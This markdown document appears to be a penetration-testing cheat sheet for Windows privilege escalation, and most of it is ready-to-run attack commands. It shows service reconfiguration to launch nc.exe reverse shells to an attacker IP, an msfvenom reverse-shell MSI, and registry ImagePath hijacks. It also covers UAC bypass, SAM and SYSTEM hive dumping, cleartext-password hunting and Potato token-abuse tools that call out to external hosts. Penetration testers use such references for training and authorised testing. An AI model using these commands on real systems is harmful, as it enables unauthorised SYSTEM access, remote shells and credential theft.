---
title: Windows Privilege Escalation
---

## Windows Privilege Escalation

https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html
https://github.com/areyou1or0/Windows
https://git.io/JL7sx
https://github.com/C0nd4/OSCP-Priv-Esc

### Tools

```powershell
powershell.exe -ex bypass -c Import-Module .\powerup.ps1; Invoke-AllChecks
```

```powershell
winPEAS.exe cmd fast
```

---

### Weak Service Permissions

_It is very often in Windows environments to discover services that run with SYSTEM privileges and they don’t have the appropriate permissions set by the administrator. This means that either the user has permissions over the service or over the folder of where the binary of the service is stored or even worse both._

- Upload _accesschk.exe_ to a writable directory first. For XP SP0, version 5.2 of _accesschk.exe_ is needed.
- You can execute the command as follows to list potentially vulnerable services. This will show list each service and the groups which have write permissions to that service. if you have an account in any of these groups then you’ve potentially got privilege escalation.

```powershell
accesschk.exe -uwcqv * -accepteula
```

- You could instead supply a group/user and it will limit output to services that group/user has write permission to.

```powershell
accesschk.exe "Users" -uwcqv * -accepteula
accesschk.exe "NT AUTHORITY\INTERACTIVE" -uwcqv * -accepteula
accesschk.exe "Everyone" -uwcqv * -accepteula
```

- The output will be the service name, the group name and the permissions that group has. Anything like _SERVICE_CHANGE_CONFIG_ or _SERVICE_ALL_ACCESS_ is a win.
- The next step is to determine the status of this service and the binary path name.

```powershell
sc qc "Service Name"
```

- Case-a) Add the user to the admin group.

```powershell
sc config "Service Name" binPath="net localgroup administrators <username> /add"
```

- Case-b) Upload nc.exe to writable directory and change the config of service

```powershell
sc config "Service Name" binpath= "C:\Inetpub\nc.exe -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe"
sc config "Service Name" obj= ".\LocalSystem" password= ""
```

- Restart Service

```powershell
net stop [service name] && net start [service name]
```

---

### Executable file

Here we are looking for executable files associace with a service that we can overwrite.

- Find the files where we have write permission

```powershell
accesschk.exe -wusv "user" "C:\Program Files" | findstr /E /C:".exe"
```

- Find out the service name

```powershell
wmic service name,pathname | findstr <name_service.exe>
```

- Generate a malicios exe file and dopr it in the target directory

---

### Schedule Task

_Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite._

- List all the tasks

```powershell
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | where {$_.Principal.UserID -eq "SYSTEM" -and $_.TaskPath -notlike "\Microsoft*"} | Select-Object TaskName, @{Name="FilePath";Expression={$_.Actions[0].Execute}}
```

- Copy-paste the text and past it into file on Kali _schtask.txt_
- Search the task with privilege. You can change the name SYSTEM to another privileged user.

```powershell
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

- Launching a Scheduled Task manually using _schtasks_.

```powershell
schtasks /RUN /TN "Task Name"
```

---

### Insecure Service Registry Permissions

- Find writable registry keys for services using Accesschk.

```powershell
accesschk.exe "NT AUTHORITY\INTERACTIVE" -kvuqsw hklm\System\CurrentControlSet\services -accepteula
accesschk64.exe "BUILTIN\Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula
accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accepteula
```

- Hunt the kyes with Linux

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List | Out-File -FilePath C:\temp\service_keys.txt
```

On Linux run

```bash
cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users" | grep -v "ReadKey" | grep -B 1 -i "Authenticated Users|\BUILTIN\\\Users\|Everyone\|INTERACTIVE\|FullControl\|Modify\|Write"
```

- Check query value.

```powershell
reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
```

- Change image path.

```powershell
reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
```

```powershell
Set-ItemProperty -Path "hklm:\System\CurrentControlSet\services\SomeSoftwareName" -Name "ImagePath" -Value "C:\temp\evil.exe"
```

- Restart the service and the custom payload will be executed instead of the service binary and it will return back a shell as SYSTEM.

```powershell
sc start "SomeSoftwareName"
```

---

### DLL Hijacking

In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.

- Find missing DLL

```powershell
powershell.exe -ep bypass -c Import-Module .\powerup.ps1; Find-PathDLLHijack
```

- Check if you have frite permission in the directory

```powershell
icacls <path dll>
```

- Compile a malicios dll with msfvenom and move it into the vulnerable directory.
- Restart the process

---

### AlwaysInstallElevated

_AlwaysInstallElevated is functionality that offers all users (especially the low privileged user) on a windows machine to run any MSI file with elevated privileges._

- Check if these 2 registry value is 1.

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- If yes, create malicious file.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi-nouac -o evil.msi
```

- Execute your file on victim.

```powershell
msiexec /quiet /qn /i C:\evil.msi
```

---

### Unquoted paths

_If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges_

- For example, the following path would be vulnerable:

```powershell
C:\Program Files\canon\IJ Scan Utility\SETEVENT.exe
```

- We could place our payload with any of the following paths:\*

```powershell
C:\Program.exe
C:\Program Files\canon\IJ.exe
```

- The following command will display affected services:

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

---

```powershell
tanter.exe <user name>
```

---

### UAC Bypass

```powershell
akagi32 <Key> <executable file>
```

```powershell
akagi32 10 c:\windows\system32\reverse_shell.exe
```

---

### Saved session information (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)

```powershell
powershell.exe -ep bypass -c Import-Module SessionGopher.ps1;Invoke-SessionGopher -Thorough
```

```powershell
SessionGopher.exe
```

---

### ClearText passwords

- Find all passwords in all files

```powershell
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /spin "password" *.*
```

- Credentials in cmdkey

```powershell
cmdkey /list
```

- Find passwords in event log files.

```powershell
C:\Windows\System32\Config\*.evt
```

```powershell
C:\Windows\System32\winevt\Logs\*.evtx
```

```
Get-WinEvent -path file.evtx
```

- SAM and SYTEM file

```powershell
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system

C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
C:\Windows\repair\system
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\system
```

- These are common files to find them in. They might be base64-encoded. So look out for that

```powershell
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
```

- In Registry

```powershell
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

### Escalate to SYSTEM from Administrator

```powershell
psexec -i -s cmd.exe /accepteula
```

---

### Kernel exploit

- python windows exploit suggester using systeminfo output

```bash
python windows-exploit-suggester.py --upadte
python windows-exploit-suggester.py --systeminfo <filename>
```

- Already compiled exploit

```powershell
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits
```

---

### Juicy Potato (Abusing the golden privileges)

> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**  
> If the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**

- Binary available at : https://github.com/ohpe/juicy-potato/releases

1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)

   ```powershell
   whoami /priv
   ```

2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object

   - [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)
   - [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
   - [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
   - [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
   - [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)
   - [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
   - [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)

3. Execute JuicyPotato to run a privileged command.

   ```powershell
   JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
   JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
   JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
       Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
       ......
       [+] authresult 0
       {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
       [+] CreateProcessWithTokenW OK
   ```

---

### Rogue Potato (Fake OXID Resolver)

- Binary available at https://github.com/antonioCoco/RoguePotato

```powershell
# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine.
# Use this if you have fw restrictions.
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"

# RoguePotato all in one with RogueOxidResolver running locally on port 9999
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999

#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
```

---

### JuicyPotatoNG

- [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

```powershell
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
```

---

### Restore A Service Account's Privileges

> This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.

```powershell
# https://github.com/itm4n/FullPowers

c:\TOOLS>FullPowers
[+] Started dummy thread with id 9976
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19041.84]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```

---

### Token Impersonation

> Incognito is a tool which can be used for privilege escalation, typically from Local Administrator to Domain Administrator

```powershell
incognito.exe list_tokens -u
```

```powershell
incognito.exe execute "NT AUTHORITY\SYSTEM" "cmd /c whoami >.\outout.txt"
```

---
